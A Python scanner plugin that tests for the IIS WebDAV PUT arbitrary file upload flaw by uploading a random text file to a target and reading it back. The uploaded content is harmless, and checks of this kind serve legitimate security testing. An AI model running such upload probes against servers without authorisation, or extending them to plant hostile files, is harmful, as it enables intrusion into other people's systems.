#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'iis_webdav_put'
        self.info = "Check the IIS WebDav PUT arbitrary file upload"
        self.keyword = ['all', 'iis', 'webdav', 'file_upload', 'web', 'intranet', 'danger']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        file_name = file_content = random8string()
        url1 = "http://%s:%d/%s.txt"%(ip, int(port), file_name) if add_web_path == "" else "http://%s:%d/%s/%s.txt"%(ip, int(port), add_web_path, file_name)
        url2 = "http://%s:%d/%s.txt"%(ip, int(port), file_name) if add_web_path == "" else "https://%s:%d/%s/%s.txt"%(ip, int(port), add_web_path, file_name)

        try:
            req = Requester(url1, method='put', data={'test':file_content})
            req_get = Requester(url1, method='get')
            if req_get.code == 200 and check_200_or_404(url1) and file_content in str(req_get.html):
                result = "exists IIS WebDav PUT arbitrary file upload, check url: %s"%(url1)
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2, method='put', data={'test':file_content})
                req_get = Requester(url2, method='get')
                if (req_get.code == 200 and check_200_or_404(url2) and file_content in str(req_get.html)):
                    result = "exists IIS WebDav PUT arbitrary file upload, check url: %s"%(url2)
                    self._output(ip, port, result)
            except:
                pass
        except:
            pass

globals()['VulnChecker'] = VulnChecker